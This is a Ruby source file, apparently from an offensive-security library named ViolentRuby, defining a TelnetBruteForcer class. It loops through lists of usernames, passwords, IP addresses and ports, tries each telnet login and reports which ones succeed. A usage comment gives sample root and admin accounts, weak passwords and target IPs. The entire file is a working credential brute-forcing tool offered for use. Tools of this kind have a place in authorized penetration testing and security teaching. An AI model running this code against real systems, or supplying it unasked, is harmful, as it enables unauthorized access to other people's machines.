require 'net/telnet'

module ViolentRuby
  # TelnetBruteForcer can be used to brute force telnet connections.
  # It can give out false-positives as 'net/telnet' login method depends
  # on seeing the strings 'username' and 'password' to supply the creds. 
  # In case the server doesn't give out those strings, this will fail.
  #
  # Author: Gr3a7Wh173 
  #
  # Usage:
  # require 'violent_ruby'
  # t = ViolentRuby::TelnetBruteForcer.new
  #
  # t.users = ["admin", "root"]
  # t.passwords = ["passwords", "dragon", "1234567"]
  # t.ips = ["192.34.24.54", "1.2.3.4"]
  # t.ports = ["23"]
  # t.brute_force do |a|
  #   puts a if a[:type] == "SUCCESS"
  # end
  class TelnetBruteForcer

    # @attr [Array] users array of usernames
		attr_accessor :users
		# @attr [Array] passwords array of passwords
		attr_accessor :passwords
		# @attr [Array] ips array of IP addresses
		attr_accessor :ips
		# @attr [Array] ports array of ports
		attr_accessor :ports

		# Initializes the TelnetBruteForcer
		#
		# @param [Hash] args Options (same as FtpBruteForcer's)
		def initialize(args = {})
			self.users = process_arg(args[:users])
			self.passwords = process_arg(args[:passwords])
			self.ips = process_arg(args[:ips])
			self.ports = process_arg(args[:ports])
		end

    # Start the brute force attack
    def brute_force
      results = []
      self.users = file_to_enum(self.users)
      self.passwords = file_to_enum(self.passwords)
      self.ips = file_to_enum(self.ips)
      self.ports = file_to_enum(self.ports)
      
      self.ips.each do |ip|
        ip = ip.strip
        self.ports.each do |port|
          port = port.strip
          self.users.each do |user|
            user = user.strip
            self.passwords.each do |password|
              password = password.strip
              
              if able_to_login? ip: ip, port: port, user: user, password: password
                result = format_result("SUCCESS", ip, port, user, password)
							else
                result = format_result("FAILURE", ip, port, user, password)
							end
              
              results << result
              yield result if block_given?
            end
          end
        end
      end
      results
    end
    
    # Check if we can login
    # @param [Hash] args Options
    def able_to_login?(args = {})
      begin
        telnet = Net::Telnet::new("Host" => args[:ip], "Port" => args[:port])
        telnet.login(args[:user], args[:password])
        return true
      rescue => e
        return false
      end
    end
    
    alias brute_force! brute_force

    private

    # @api private
    # Process arguments
		def process_arg(arg)
			if arg.is_a? Array or arg.is_a? NilClass
				return arg
			else
				file_to_enum(arg)
			end
		end
		
    # @api private
    # Convert a file to an enum
		def file_to_enum(arg)
      return arg.each if arg.is_a? Array
			raise ArgumentError, "Argument must be a filename or an array" unless File.file? arg
			File.open(arg, "r").each_line
		end

    # @api private
		# Format the result in our desired form
		def format_result(type, ip, port, user, password)
      { time: Time.now, type: type, ip: ip, port: port, user: user, password: password }
		end
	end
end